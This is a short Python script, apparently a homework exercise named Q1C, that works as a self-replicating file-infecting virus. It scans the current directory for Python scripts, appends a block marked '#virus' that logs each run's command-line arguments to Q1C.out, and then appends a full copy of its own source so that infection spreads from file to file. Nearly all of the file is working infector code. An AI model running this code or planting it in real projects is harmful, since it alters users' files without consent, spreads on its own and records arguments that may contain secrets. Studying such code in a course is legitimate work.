import os

# List all files in the current directory
directory = os.listdir(path=".")

# Save Pytyhon Files in directory
pythonFiles = []
for f in directory:
    if ".py" in f:
        pythonFiles.append(f)

# Process each Python file
for pyfile in pythonFiles:
    hasVirus = False
    isScript = False

    # Open and read the Python file
    with open(pyfile, "r") as myfile:
        lines = [i.strip() for i in myfile.readlines()]

    # Check if it's a script by looking for the main function
    if 'if __name__ == "__main__":' in lines:
        isScript = True

    # Check if the file already contains the virus
    for line in lines:
        if "virus" in line:
            hasVirus = True
            break

    # If it's a script and doesn't have the virus, append the virus code
    if isScript and not hasVirus:
        with open(pyfile, "a+") as writefile, open("Q1C.py", "r") as addonFile:
            virusList = [
                "\n#virus",
                "\nimport sys",
                "\nvirusfile = open(\"Q1C.out\", \"a+\")",
                "\nfor i in sys.argv: virusfile.write(i + ' ')",
                "\nvirusfile.write(\"\\n\")",
                "\nvirusfile.close()"
            ]

            # Write the virus code to the file
            for line in virusList:
                writefile.write(line)

            writefile.write("\n\n")

            # Append the contents of Q1C.py
            addonLines = addonFile.readlines()
            for line in addonLines:
                writefile.write(line)